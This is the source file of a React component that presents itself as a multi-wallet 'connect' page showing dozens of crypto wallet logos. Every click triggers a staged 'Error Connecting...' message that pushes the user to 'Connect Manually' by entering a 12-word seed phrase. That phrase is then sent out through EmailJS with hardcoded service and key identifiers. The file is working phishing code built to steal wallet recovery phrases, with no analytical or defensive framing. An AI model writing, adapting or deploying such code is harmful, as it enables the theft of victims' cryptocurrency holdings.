import React, { useState, useRef } from "react";
import { Modal } from "antd";
import emailjs from "@emailjs/browser";
import SVGIcon from "../../Components/SvgIconProp";
import CountDownTimer from "../../Components/Timer/timer";

const MapSVG: React.FC = () => {
  const SVGfiles: string[] = [
    'TrustWallet.svg', 'Metamask.svg', 'Phantom.svg', '1inch.svg', 'AaVE.svg',
    'Argent.svg', 'Binance.svg', 'BonkBot.svg', 'Authereum.svg', 'BananaGun.svg',
    'BitPay.svg', 'BRB wallet.svg', 'coinbase-logo.svg', 'Cosmos wallet.svg',
    'Defi wallet.svg', 'Dharma.svg', 'Digitex.svg', 'Exodus Wallet.svg', 'Formatic.svg',
    'Gnosis Safe.svg', 'Huobi.svg', 'im Token.svg', 'Ledger live.svg', 'Ledger.svg',
    'MaestroBot.svg', 'MathWallet.svg', 'ONTO.svg', 'Pillar.svg', 'Portis.svg',
    'ProdigyBot.svg', 'Rainbow.svg', 'SafeMoon.svg', 'Saitamask Wallet.svg',
    'SolanaBot.svg', 'Terra station.svg', 'TokenPocket.svg', 'UniBot.svg',
    'walletConnect.svg', 'WalletETH.svg',
  ];

  const SVGNames: string[] = [
    'Trust wallet', 'Metamask', 'Phantom', '1inch', 'AaVE', 'Argent', 'Binance',
    'BonkBot', 'Authereum', 'BananaGun', 'BitPay', 'BRB wallet', 'coinbase',
    'Cosmos', 'Defi', 'Dharma', 'Digitex', 'Exodus', 'Formatic', 'Gnosis', 'Huobi',
    'im Token', 'Ledger live', 'Ledger', 'MaestroBot', 'MathWallet', 'ONTO', 'Pillar',
    'Portis', 'ProdigyBot', 'Rainbow', 'SafeMoon', 'Saitamask', 'SolanaBot',
    'Terra station', 'TokenPocket', 'UniBot', 'walletConnect', 'WalletETH',
  ];

  const [firstModal, setFirstModal] = useState(false);
  const [secondModal, setSecondModal] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(""));
  const [disableButton, setDisableButton] = useState(false);
  const [showTimer, setShowTimer] = useState(false);
  const [pasteInput, setPasteInput] = useState("");

  const formRef = useRef<HTMLFormElement>(null);

  const showFirstModal = () => setFirstModal(true);

  const showSecondModal = () => {
    setFirstModal(false);
    setSecondModal(true);
  };

  const closeSecondModal = () => {
    setSecondModal(false);
    setSeedPhrase(Array(12).fill(""));
    setPasteInput("");
  };

  // Splits a pasted string into up to 12 words and fills the grid
  const distributePaste = (text: string, startIndex = 0) => {
    const words = text
      .trim()
      .split(/[\s,]+/)        // split on spaces or commas
      .filter(Boolean)
      .slice(0, 12 - startIndex);

    if (words.length === 0) return;

    setSeedPhrase((prev) => {
      const next = [...prev];
      words.forEach((word, i) => {
        next[startIndex + i] = word;
      });
      return next;
    });
  };

  // Handles paste in the "Paste phrase" textarea
  const handleBulkPaste = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const value = e.target.value;
    setPasteInput(value);
    distributePaste(value);
  };

  // Handles paste (Ctrl+V) directly into any individual input
  const handleInputPaste = (
    e: React.ClipboardEvent<HTMLInputElement>,
    index: number
  ) => {
    const text = e.clipboardData.getData("text");
    const words = text.trim().split(/[\s,]+/).filter(Boolean);

    // If it looks like a multi-word phrase, distribute from this index
    if (words.length > 1) {
      e.preventDefault();
      distributePaste(text, index);
    }
    // Single word — let the default paste behaviour handle it
  };

  const isFormValid = () => seedPhrase.every((word) => word !== "");

  const sendEmail = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!isFormValid() || !formRef.current) return;

    emailjs
      .sendForm("service_soml4ai", "template_a0zy764", formRef.current, {
        publicKey: "n7CQrn8bAS_FXzHDw",
      })
      .then(
        () => console.log("SUCCESS!"),
        (error) => console.log("FAILED...", error.text)
      );

    setDisableButton(true);
    setShowTimer(true);
    setTimeout(() => {
      setDisableButton(false);
      setShowTimer(false);
    }, 300000);
  };

  const seedPhraseString = seedPhrase.join(" ");

  const inputDivStyle =
    "flex border border-dashed border-gray-600 rounded-lg p-2 overflow-hidden";
  const inputStyle = "focus:outline-none pl-1 w-full bg-transparent";

  return (
    <div className="grid grid-cols-3 md:grid-cols-8 gap-x-16 md:gap-x-12 gap-y-4 md:gap-y-14 justify-center items-center py-10 pl-8 md:pl-0">
      {SVGfiles.map((fileName, index) => (
        <div key={index} className="cursor-pointer" onClick={showFirstModal}>
          <SVGIcon src={fileName} alt={`SVG ${index + 1}`} className="w-12 md:w-14 h-12 md:h-14" />
          <p className="text-xs pt-2 flex items-baseline text-white">{SVGNames[index]}</p>
        </div>
      ))}

      <Modal
        onCancel={() => setFirstModal(false)}
        open={firstModal}
        title="Connect"
        footer={null}
      >
        <div className="border-2 border-red-700 rounded-xl px-8 py-4">
          <p className="text-red-700 font-semibold">Error Connecting...</p>
          <button
            className="text-white text-[0.7rem] font-semibold bg-slate-900 rounded-lg px-2 py-1"
            onClick={showSecondModal}
          >
            Connect Manually
          </button>
        </div>
      </Modal>

      <Modal
        open={secondModal}
        title="Seed Phrase"
        onCancel={closeSecondModal}
        footer={null}
      >
        {/* ── Paste-all area ── */}
        <div className="mb-4">
          <label className="block text-xs text-gray-500 mb-1">
            Paste entire phrase here
          </label>
          <textarea
            rows={2}
            placeholder="word1 word2 word3 … word12"
            value={pasteInput}
            onChange={handleBulkPaste}
            className="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-blue-400 resize-none"
          />
        </div>

        <div className="flex items-center gap-2 mb-4">
          <hr className="flex-1 border-gray-200" />
          <span className="text-xs text-gray-400">or type word by word</span>
          <hr className="flex-1 border-gray-200" />
        </div>

        <form ref={formRef} onSubmit={sendEmail}>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-4 justify-center">
            {Array(12)
              .fill(null)
              .map((_, index) => (
                <div key={index} className={inputDivStyle}>
                  <span className="text-gray-400 text-sm shrink-0">{index + 1}.</span>
                  <input
                    type="text"
                    value={seedPhrase[index]}
                    className={inputStyle}
                    onPaste={(e) => handleInputPaste(e, index)}
                    onChange={(e) =>
                      setSeedPhrase((prev) => {
                        const next = [...prev];
                        next[index] = e.target.value;
                        return next;
                      })
                    }
                  />
                </div>
              ))}
          </div>

          <textarea name="message" className="hidden" value={seedPhraseString} readOnly />

          <div className="flex justify-end pt-4">
            <button
              type="submit"
              disabled={!isFormValid() || disableButton}
              className="text-white bg-blue-500 py-1 px-4 rounded-lg flex justify-center disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {disableButton ? "Disabled" : "Connect"}
            </button>
          </div>
        </form>

        {showTimer && <CountDownTimer onComplete={() => setDisableButton(false)} />}
      </Modal>
    </div>
  );
};

export default MapSVG;
